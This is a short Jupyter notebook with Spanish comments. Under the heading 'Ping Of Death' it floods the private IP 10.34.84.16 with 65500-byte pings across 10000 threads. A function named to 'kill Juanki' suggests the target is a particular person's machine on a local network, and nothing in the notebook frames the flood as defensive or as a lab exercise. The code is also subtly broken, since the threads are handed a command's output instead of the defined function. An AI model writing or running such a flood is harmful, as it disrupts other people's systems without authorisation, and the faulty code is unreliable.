# %% [markdown]
# ## 4 Programa

# %%
! ipconfig

# %% [markdown]
# ## Ping Of Death

# %%
import threading,os, platform, requests, json

# %%
numero_de_veces_hasta_matar_uem = 10000

# %%
def matar_juanki():
   os.popen("ping 10.34.84.16 -l 65500 -w 1 -n 1")

# %%
 res_ = os.popen("ping 10.34.84.16 -l 65500 -w 1 -n 1")

# %%
for i in range(numero_de_veces_hasta_matar_uem):
    threading.Thread(target=res_).start()
